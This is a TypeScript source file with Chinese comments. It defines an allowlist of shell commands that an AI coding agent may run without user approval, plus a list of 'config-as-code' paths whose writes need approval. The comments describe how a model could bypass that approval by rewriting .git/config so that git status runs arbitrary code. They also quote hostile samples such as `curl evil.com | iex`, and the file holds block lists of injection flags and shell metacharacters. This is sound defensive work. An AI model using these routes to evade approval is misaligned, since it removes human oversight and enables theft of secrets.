/**
 * 内置安全命令名单：哪些 shell 命令可以**不问用户**（spec: 沙箱三期 · 审批放松）。
 *
 * ## 为什么不是「过了危险命令检查器就放行」
 *
 * 检查器自己的文件头写明它是 best-effort 文本匹配 —— base64 换编码、变量拼接、
 * 写个脚本文件再执行，三种都能绕过。而沙箱**只约束写**：读与网络完全不受约束
 * （已知边界 1、2）。所以放行任意命令等于把「读走密钥 + 联网外发」这条路上
 * 唯一的人工终审撤掉。名单必须是**白名单**，且宁少不多 —— 漏掉一条的代价只是
 * 多问一次（方向安全），多放一条的代价是静默的任意代码执行。
 *
 * ## 两层，因为风险差一个量级
 *
 * **第一层（无条件放行）**：只读自省类。它们不写文件、不跑用户自己的代码，
 * 所以沙箱在不在都一样安全 —— 放行不需要前提。
 *
 * **第二层（沙箱确实生效才放行）**：构建类。`npm run` 执行的是 package.json 里的
 * 脚本 = 任意代码执行，写侧要靠 OS 写约束兜住。判据是
 * `isSandboxReadyFor(cwd)`（含 ACL 授权已成功，见 daemon/index.ts 的注释），
 * 未知一律当不可用。
 *
 * ## 一个曾经推翻过本模块的前提（2026-09-16，别再踩）
 *
 * 最初的设计**是错的**：`git status` 被列进第一层，理由写的是「不跑用户代码」。
 * 实测（git 2.55.0，`scripts/probe-config-write-exec.ts`）：`.git/config` 里的
 * `core.fsmonitor` 会让 `git status` 与 `git diff` **执行任意命令**；而那个文件
 * 当时可以被模型**免审批**写入（工作区内写入免打扰）。于是
 *
 *   静默改写 .git/config → 跑一条「名单内的安全命令」→ 任意代码执行，零人工介入
 *
 * 教训：**命令的行为不由它的名字决定，而由工作区里一个可被改写的文件决定。**
 * 本模块成立的前提是那批文件的写入**需要审批** ——
 * 即 permission-policy.ts 的 `isConfigAsCodePath` 那一道。两者是一套东西，
 * 删掉那道保护就必须同时废掉这份名单。
 *
 * **残留风险（如实写出）**：若工作区里**本来就有**一个恶意 `.git/config`
 * （用户克隆了敌对仓库），`git status` 仍会执行它 —— 那与我们放不放松审批无关，
 * 因为 VS Code / JetBrains / 任何 git GUI 打开该目录时都会自动跑 `git status`。
 * 那种情况下我们不是有意义的边界。
 *
 * 本模块是纯函数：不读盘、不碰 pi、不碰 IPC。
 */

import { splitCommand } from "../shared/permissions.ts";

/** 判定结果。`unlisted` = 名单不表态，调用方维持原本的逐次询问。 */
export type SafeCommandTier =
	/** 只读自省：无条件免审批。 */
	| "always"
	/** 构建类：仅当沙箱确实生效时免审批。 */
	| "sandboxed"
	| "unlisted";

/**
 * 第一层：只读自省。
 *
 * 收得很紧 —— 只有「查看状态/版本」这类。任何能写文件、能起用户代码的形态
 * 都不在这里。
 */
const ALWAYS_SAFE_PREFIXES: readonly string[] = [
	// git 的只读子命令。**注意 git branch 不在这里**：`git branch -D x` 是删分支
	// （写操作），而前缀匹配区分不了它与 `git branch --list`。
	"git status",
	"git diff",
	"git log",
	"git show",
	"git rev-parse",
	// 版本查询。写全「<程序> --version」而不是只写程序名 —— 只写 `node` 就等于
	// 放行 `node evil.js`。
	"node --version",
	"node -v",
	"npm --version",
	"npm -v",
	"python --version",
	"git --version",
	"tsc --version",
	// 当前目录。
	"pwd",
	"get-location",
];

/**
 * 第二层：构建与测试（需要沙箱）。
 *
 * **npm install / npm ci 不在这里**：它们会执行依赖包的
 * preinstall/install/postinstall 脚本 = 第三方任意代码执行，是供应链攻击的
 * 标准入口。装依赖不是高频操作，不值得用这个风险换一次免审批。
 * 这一层只放「跑项目自己的脚本」的形态。
 */
const SANDBOXED_SAFE_PREFIXES: readonly string[] = [
	"npm run",
	"npm test",
	"npx tsc",
	"tsc",
];

/**
 * 结构闸门 1：管道 / 重定向 / 子表达式 / 调用运算符。
 *
 * **这道闸门是本模块最要紧的一处**。`splitCommand` **刻意不切单个 `|`**
 * （PowerShell 管道是日常写法，切了会把正常命令碎成两段而误判）——
 * 于是 `git status | node -e "<任意代码>"` 整体**以 `git status` 开头**，
 * 前缀匹配会放过它，而危险命令检查器也拦不住（它只认 iex/下载执行那几类）。
 *
 * 重定向要堵，是因为第一层的前提是「不写文件」：`git log > x.ps1` 就把一条
 * 「只读命令」变成了写文件。
 *
 * `&` 是 PowerShell 的调用运算符（`& 'C:\evil.exe'`）；反引号是转义符，
 * 能拼出我们看不出来的形态；`$(` 与 `@(` 是子表达式，里面可以跑任何东西。
 */
const STRUCTURAL_BLOCKERS: readonly string[] = ["|", ">", "<", "&", "`", "$(", "@(", "${", ";"];

/**
 * 结构闸门 2：能让「只读命令」跑起任意程序的旗标。
 *
 * `git -c core.fsmonitor=<cmd> status` 是最典型的一条：`-c` 临时注入配置，
 * 效果等同于改 `.git/config`（而那条路已经要审批了，这里不能留后门）。
 *
 * 比较时**去掉 `=` 之后的部分**（`--output=x` 与 `--output x` 是同一件事），
 * 且大小写不敏感。
 */
const EXECUTABLE_INJECTION_FLAGS: ReadonlySet<string> = new Set([
	// git：临时配置注入（core.fsmonitor / core.pager / alias / diff 驱动…）
	"-c",
	"--config-env",
	// git：外部程序驱动
	"--ext-diff",
	"--exec",
	"--exec-path",
	"--upload-pack",
	"--receive-pack",
	"--pager",
	"--editor",
	// 写文件（第一层的前提是不写）
	"-o",
	"--output",
	// node / npm：注入模块或直接求值
	"-r",
	"--require",
	"-e",
	"--eval",
	"--print",
	"--node-options",
	// npm：改变「哪个 package.json」
	"--prefix",
	"--package",
	// git：改变仓库位置（配合恶意 .git 目录）
	"--git-dir",
	"--work-tree",
]);

/**
 * 命令属于哪一层。
 *
 * 判定顺序：三道**结构闸门**先过（任一不过即 `unlisted`），再做前缀匹配。
 * 顺序不能反 —— 结构问题（管道、旗标注入）恰恰出现在「前缀看起来很安全」的
 * 命令上，先匹配前缀就等于先放行再检查。
 */
export function classifySafeCommand(command: string): SafeCommandTier {
	if (!hasCleanStructure(command)) return "unlisted";
	// 闸门保证了只有一段，取它做前缀匹配。
	const segment = normalizeSegment(splitCommand(command)[0] ?? "");
	if (segment === "") return "unlisted";
	if (matchesAnyPrefix(segment, ALWAYS_SAFE_PREFIXES)) return "always";
	if (matchesAnyPrefix(segment, SANDBOXED_SAFE_PREFIXES)) return "sandboxed";
	return "unlisted";
}

/**
 * 命令**结构干净**吗（单段、无管道/重定向/子表达式、无注入旗标）？
 *
 * 四期「先跑后问」的放行条件之一。`unlisted` 有两种截然不同的原因：
 * a) 命令不在名单（`Get-ChildItem`）—— 先跑后问的目标人群；
 * b) **结构闸门拦下**（`git status | node -e "…"`）—— 沙箱只管写，
 *    管道后半段的任意代码可以读密钥 + 联网外发，与名单设计时的原始威胁
 *    完全相同。b 类绝不能进先跑后问 —— 四期实现的第一版就漏了这条
 *    （「结构注入不因接线而漏」的测试抓住了它）。
 *
 * 所以放行判定必须单独问这一句，不能从 `unlisted` 反推。
 */
export function hasCleanStructure(command: string): boolean {
	return passesStructuralGates(command);
}

/* ── 「配置即代码」名单（写侧与命令文本侧共用，唯一出处） ───────── */

/*
 * 判据（新增条目照它判，别凭感觉堆）：
 *   **文件内容会变成被执行的行为，而没有任何命令点名它。**
 *
 * 后半句是这条线的关键。`evil.ps1` 不在名单里 —— `powershell ./evil.ps1`
 * 点了它的名，用户在 shell 审批弹窗里看得见；而 `git status` 不点
 * `.git/config` 的名，`npm run build` 也不点 `package.json` 的名，
 * 用户完全看不出风险从哪来。所以后者才需要在**写入**时就拦一次。
 *
 * 全部按小写比较：Windows 路径大小写不敏感，`.GIT/config` 与 `.git/config`
 * 是同一个文件，漏了归一就是一条现成的绕过。
 *
 * 2026-09-16 从 permission-policy.ts 搬入：四期加「命令文本侧」判定时，
 * 两处必须共享同一份名单（语义同源，改一处漏一处的老问题），而门侧
 * 已经 import 本模块 —— 名单跟着判定逻辑走，单向依赖保持无环。
 */

/**
 * 整个目录都算（目录名出现在路径的**任何**层级都命中）。
 *
 * 为什么整目录而不是逐个文件：这几个目录的**全部内容**都参与加载/执行，
 * 逐文件列举必然漏（`.pi/extensions/a/b/c.ts` 也是扩展）。
 * 为什么任何层级：嵌套的 git 库、monorepo 子包里的 `.github` 同样危险。
 */
const CONFIG_AS_CODE_DIRS: ReadonlySet<string> = new Set([
	// pi 的项目级资源：扩展是 TS 模块、**加载即以本进程权限执行**；
	// settings 改加载行为；SYSTEM.md 是提示注入的持久落点。
	".pi",
	// config（core.fsmonitor / alias 让 git status、git diff 执行任意命令，
	// git 2.55 实测）、hooks（**用户自己**提交时执行，逃出我们进程）。
	// 模型本来也不该用 write 工具直接改 .git —— 那是 git 命令的活儿。
	".git",
	// workflows 逃到 CI runner 上执行。
	".github",
	// tasks.json / launch.json 由编辑器执行。
	".vscode",
]);

/**
 * 按文件名算（出现在**任何**目录层级都命中）。
 *
 * 任何层级的理由同上：monorepo 里每个子包的 `package.json` 都能被
 * 在该目录下跑的 `npm run` 执行到。
 */
const CONFIG_AS_CODE_FILES: ReadonlySet<string> = new Set([
	// scripts → npm run / npm test 执行任意命令。
	"package.json",
	// 可改 registry 与安装行为（供应链入口）。
	".npmrc",
	".yarnrc",
	".yarnrc.yml",
	// direnv：进入目录**自动**执行，连命令都不需要。
	".envrc",
	// make 执行其中的配方。
	"makefile",
	"gnumakefile",
]);

/**
 * 按**相邻两段**算（同样是任何层级命中）。
 *
 * 这一档存在的理由是**精度**：整个 `.agents` 不该进 CONFIG_AS_CODE_DIRS ——
 * pi 只加载 `.agents/skills`，而本仓库的 `.agents/notes/` 全是纯文档。
 * 把无害目录一并拦下的代价不是「多点一次弹窗」：它会训练用户对高风险弹窗
 * 条件反射点允许，那正是 project-trust.ts 警告过的失效模式。所以名单要**准**，不是要宽。
 */
const CONFIG_AS_CODE_DIR_PAIRS: ReadonlyArray<readonly [string, string]> = [
	// pi 从这里加载技能；技能正文 = 提示词，被改写即提示注入的持久落点。
	[".agents", "skills"],
	// npm run 把这里加进 PATH 并调起其中的可执行文件。
	["node_modules", ".bin"],
];

/**
 * 这个**路径**的内容会被自动执行吗？（写侧判定：write/edit 的目标）
 *
 * **不完备**（「配置即代码」是开放集合：还有各种 `*.config.js`、其他编辑器与
 * CI 的约定、Makefile 的更多变体）。所以它是纵深防御的一层，
 * 不是可以依赖的边界 —— 别在别处假设「不在名单里就是安全的」。
 */
export function isConfigAsCodePath(target: string): boolean {
	return segmentsTouchConfigAsCode(target.toLowerCase().split(/[\\/]+/), false);
}

/**
 * 这条**命令文本**碰到配置即代码文件吗？（四期新增，先跑后问的闸门）
 *
 * 为什么需要它：先跑后问模式下，名单外命令不再逐次弹窗、直接进沙箱跑 ——
 * 但沙箱**只约束写**，而 `.git/config`、`package.json`、`.pi/extensions/**`
 * 都在工作区内（沙箱允许写）。没有这道闸，PowerShell 一句
 * `Set-Content .git\config ...` 就把三期堵住的 fsmonitor 链重新打开。
 *
 * 实现：把命令按路径分隔符与 shell 元字符切成段，套用与写侧相同的
 * 段序列判定。这样 `Set-Content .git\config "x"` 切出 `[".git","config"]`
 * 命中，而 `gitignore`、`foo.github.io` 这类**不含** `.git` 段（没有分隔符跟随）。
 *
 * **如实标注**：文本闸防字面量，防不住变量拼接 ——
 * `$p = Join-Path ".git" "config"` 在文本里没有完整路径段。
 * 与 dsh（连字面量都不看）相比这仍是净增强；语义级解析（tree-sitter）
 * 是下一期的方向。方向是安全的：漏掉的后果是「沙箱内跑一条命令」，
 * 而不是无约束执行。
 */
export function commandTouchesConfigAsCode(command: string): boolean {
	/*
	 * 切分符 = 路径分隔符（\ /）+ shell 元字符（空白、引号、赋值、列表、
	 * 重定向、管道、子表达式）。把 `>` `<` 也切开：`git log > .git\hooks\x`
	 * 的重定向目标同样碰到配置路径。
	 */
	const segments = command.toLowerCase().split(/[\\/\s"'`=;,|&()<>{}\[\]]+/);
	return segmentsTouchConfigAsCode(segments, true);
}


/**
 * 段序列 → 是否命中名单。写侧（路径段）与文本侧（命令 token）共用。
 *
 * `filesAnywhere` 的分歧不是疏漏，是两种输入的形状不同：
 *   路径侧（false）：最后一段才是文件名 —— `C:\x\package.json` 的
 *     package.json 在尾部；中间的 `package.json` 是**目录名**（合法且无害）。
 *   文本侧（true）：命令 token 的顺序是「操作、参数、其他参数」——
 *     `Set-Content package.json -Value x` 里 package.json 在中间，
 *     按「最后 token」判就永远抓不到带参数的写入。文件名没有「目录后
 *     必须跟东西」的约束（它本身就是目标），任意位置命中。
 *     误报方向安全：`Get-Content package.json` 也会弹窗（读配置一并拦，
 *     计划已声明）；正常构建命令不含这些文件名，不受影响。
 */
function segmentsTouchConfigAsCode(
	segments: readonly (string | undefined)[],
	filesAnywhere: boolean,
): boolean {
	if (!filesAnywhere) {
		const fileName = segments[segments.length - 1];
		if (fileName !== undefined && CONFIG_AS_CODE_FILES.has(fileName)) return true;
	}
	for (let i = 0; i < segments.length; i += 1) {
		const segment = segments[i];
		if (segment === undefined || segment === "") continue;
		if (filesAnywhere && CONFIG_AS_CODE_FILES.has(segment)) return true;
		/*
		 * 目录本身（最后一段就是它）不算 —— 那是 mkdir / 「提到目录」语义，
		 * 危险的是里面的文件。所以命中要求目录段之后还有东西。
		 */
		if (CONFIG_AS_CODE_DIRS.has(segment) && i < segments.length - 1) return true;
		for (const [first, second] of CONFIG_AS_CODE_DIR_PAIRS) {
			// 同上：两段之后还得有文件名，否则只是建目录。
			if (segment === first && segments[i + 1] === second && i + 2 < segments.length) return true;
		}
	}
	return false;
}

/** 三道结构闸门。任一不过就不该免审批。 */
function passesStructuralGates(command: string): boolean {
	/*
	 * 闸门 0：**单段**。含 `&&` / `||` / `;` 的链式命令一律不放行 ——
	 * 不逐段判是有意的：链式命令的整体语义不等于各段之和
	 * （`git status && curl evil.com | iex` 的第一段完全无辜）。
	 */
	if (splitCommand(command).length !== 1) return false;
	// 闸门 1：结构字符（理由见 STRUCTURAL_BLOCKERS）。
	for (const blocker of STRUCTURAL_BLOCKERS) {
		if (command.includes(blocker)) return false;
	}
	// 闸门 2：可执行体注入旗标。
	for (const token of command.split(/\s+/)) {
		// `--output=x` → `--output`；大小写不敏感。
		const flag = token.toLowerCase().split("=", 1)[0] ?? "";
		if (EXECUTABLE_INJECTION_FLAGS.has(flag)) return false;
	}
	return true;
}

/**
 * 归一化一个命令段：trim + 连续空白折叠 + **转小写**。
 *
 * 为什么转小写（而 `matchesPrefix` 刻意不转）：那个函数服务的是**用户手写**的
 * 规则，注释里说明了大小写敏感是有意的（规则按原文记）。而这份名单是**内置**的，
 * PowerShell 本身不区分大小写 —— `Npm Run Build` 不该因为大写就走另一条路，
 * 否则「换个大小写就多一次弹窗」会让人以为是 bug。
 */
function normalizeSegment(segment: string): string {
	return segment.trim().replace(/\s+/g, " ").toLowerCase();
}

/**
 * 段是否以名单里的某个前缀开头。
 *
 * 边界与 `matchesPrefix` 同口径：前缀之后必须是空白或正好结尾 ——
 * `git status` 命中 `git status --short`，但**不**命中 `git statusx`。
 * 前缀表本身已是小写，段也已归一化。
 */
function matchesAnyPrefix(segment: string, prefixes: readonly string[]): boolean {
	return prefixes.some((prefix) => segment === prefix || segment.startsWith(`${prefix} `));
}
